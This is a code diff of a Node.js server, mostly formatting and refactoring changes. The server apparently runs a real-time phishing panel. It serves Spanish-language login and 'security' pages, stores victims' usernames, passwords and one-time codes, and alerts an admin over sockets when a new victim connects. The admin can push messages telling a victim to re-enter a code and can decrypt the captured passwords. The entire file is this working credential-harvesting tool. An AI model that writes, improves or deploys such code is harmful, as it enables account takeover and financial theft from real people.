@@ -16,18 +16,18 @@ const AES_KEY = process.env.AES_KEY_BASE64 ? Buffer.from(process.env.AES_KEY_BAS
 const AES_IV = process.env.AES_IV_BASE64 ? Buffer.from(process.env.AES_IV_BASE64, 'base64') : Buffer.alloc(0);
 
 if (AES_KEY.length !== 32 || AES_IV.length !== 16) {
-  console.warn('⚠️ Warning: AES key or IV not set correctly. Check your .env');
+  console.warn('Warning: AES key or IV not set correctly. See .env.example');
 }
 
-function encrypt(text) {
-  if (!text) return null;
+function encrypt(text){
+  if(!text) return null;
   const cipher = crypto.createCipheriv('aes-256-cbc', AES_KEY, AES_IV);
   const encrypted = Buffer.concat([cipher.update(String(text), 'utf8'), cipher.final()]);
   return encrypted.toString('base64');
 }
 
-function decrypt(b64) {
-  if (!b64) return null;
+function decrypt(b64){
+  if(!b64) return null;
   const encrypted = Buffer.from(b64, 'base64');
   const decipher = crypto.createDecipheriv('aes-256-cbc', AES_KEY, AES_IV);
   const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
@@ -51,30 +51,31 @@ app.use(session({
 }));
 
 // --- Serve frontend (Personal) ---
-app.use(express.static(path.join(__dirname, '..', 'Personal')));
+const PERSONAL_DIR = path.join(__dirname, '..', 'Personal');
+app.use(express.static(PERSONAL_DIR));
 
 // Rutas principales de la web
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, '..', 'Personal', 'Login', 'index.html'));
+  res.sendFile(path.join(PERSONAL_DIR, 'Login', 'index.html'));
 });
 app.get('/exoneracion', (req, res) => {
-  res.sendFile(path.join(__dirname, '..', 'Personal', 'Login', 'exoneracion.html'));
+  res.sendFile(path.join(PERSONAL_DIR, 'Login', 'exoneracion.html'));
 });
 app.get('/seguridad', (req, res) => {
-  res.sendFile(path.join(__dirname, '..', 'Personal', 'Login', 'seguridad.html'));
+  res.sendFile(path.join(PERSONAL_DIR, 'Login', 'seguridad.html'));
 });
 app.get('/confirmado', (req, res) => {
-  res.sendFile(path.join(__dirname, '..', 'Personal', 'Login', 'confirmado.html'));
+  res.sendFile(path.join(PERSONAL_DIR, 'Login', 'confirmado.html'));
 });
 
-// --- Serve admin ---
+// --- Serve admin static files ---
 app.use('/admin/static', express.static(path.join(__dirname, 'public', 'admin')));
 app.use('/sounds', express.static(path.join(__dirname, 'public', 'sounds')));
 
-// --- Admin login ---
+// --- Admin login/logout ---
 app.post('/admin/login', (req, res) => {
   const { user, pass } = req.body;
-  if (user === process.env.ADMIN_USER && pass === process.env.ADMIN_PASS) {
+  if(user === process.env.ADMIN_USER && pass === process.env.ADMIN_PASS){
     req.session.admin = true;
     return res.json({ ok: true });
   }
@@ -85,16 +86,15 @@ app.post('/admin/logout', (req, res) => {
   req.session.destroy(() => res.json({ ok: true }));
 });
 
-function requireAdmin(req, res, next) {
-  if (req.session && req.session.admin) return next();
+function requireAdmin(req, res, next){
+  if(req.session && req.session.admin) return next();
   return res.status(401).json({ ok: false, msg: 'unauthorized' });
 }
 
-// --- API: guardar datos del usuario ---
+// --- API to save user form data ---
 app.post('/api/save', (req, res) => {
   const body = req.body || {};
   const clientId = body.clientId || uuidv4();
-
   const record = {
     clientId,
     usuario: body.usuario || body.UserName || null,
@@ -106,21 +106,19 @@ app.post('/api/save', (req, res) => {
     clave_dinamica: body.clave_dinamica || body.OTPNumber || null,
     step: body.step || null
   };
-
   db.upsertUser(record);
   io.to('admins').emit('user_updated', db.getUserByClientId(clientId));
 
   const user = db.getUserByClientId(clientId);
-  if (user && !user.notified) {
+  if(user && !user.notified){
     io.to('admins').emit('new_user_connected', { clientId: user.clientId, usuario: user.usuario });
     db.setClientNotified(clientId);
   }
-
   io.to('client:' + clientId).emit('server_ack', { msg: 'saved', clientId });
   res.json({ ok: true, clientId });
 });
 
-// --- Admin API ---
+// --- Admin endpoints ---
 app.get('/admin/records', requireAdmin, (req, res) => {
   const all = db.getAllUsers();
   res.json(all.map(r => ({ ...r, password_enc: r.password_enc })));
@@ -128,17 +126,10 @@ app.get('/admin/records', requireAdmin, (req, res) => {
 
 app.post('/admin/action', requireAdmin, (req, res) => {
   const { clientId, field, action } = req.body;
-  if (!clientId || !action) return res.status(400).json({ ok: false });
-
+  if(!clientId || !action) return res.status(400).json({ ok: false });
   const note = action === 'retry' ? `retry:${field}` : `continue`;
   db.setClientCommand(clientId, note);
-
-  io.to('client:' + clientId).emit('admin_command', {
-    field,
-    action,
-    message: action === 'retry' ? `Debes volver a colocar tu ${field}` : 'Continua'
-  });
-
+  io.to('client:' + clientId).emit('admin_command', { field, action, message: action === 'retry' ? `Debes volver a colocar tu ${field}` : 'Continua' });
   io.to('admins').emit('user_updated', db.getUserByClientId(clientId));
   res.json({ ok: true });
 });
@@ -146,8 +137,7 @@ app.post('/admin/action', requireAdmin, (req, res) => {
 app.get('/admin/decrypt/:clientId', requireAdmin, (req, res) => {
   const clientId = req.params.clientId;
   const user = db.getUserByClientId(clientId);
-  if (!user) return res.status(404).json({ ok: false });
-
+  if(!user) return res.status(404).json({ ok: false });
   const decrypted = user.password_enc ? decrypt(user.password_enc) : null;
   res.json({ ok: true, password: decrypted });
 });
@@ -168,7 +158,6 @@ io.on('connection', (socket) => {
     const clientId = data && data.clientId ? data.clientId : uuidv4();
     socket.join('client:' + clientId);
     db.bindSocket(clientId, socket.id);
-
     const user = db.getUserByClientId(clientId) || { clientId };
     socket.emit('registered', { clientId, user });
     io.to('admins').emit('new_user_connected', { clientId, usuario: user.usuario });
@@ -177,6 +166,5 @@ io.on('connection', (socket) => {
   socket.on('disconnect', () => {});
 });
 
-// --- Start server ---
-const PORT = process.env.PORT || 10000;
-server.listen(PORT, () => console.log('✅ Server running on port', PORT));
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => console.log('Server running on port', PORT));
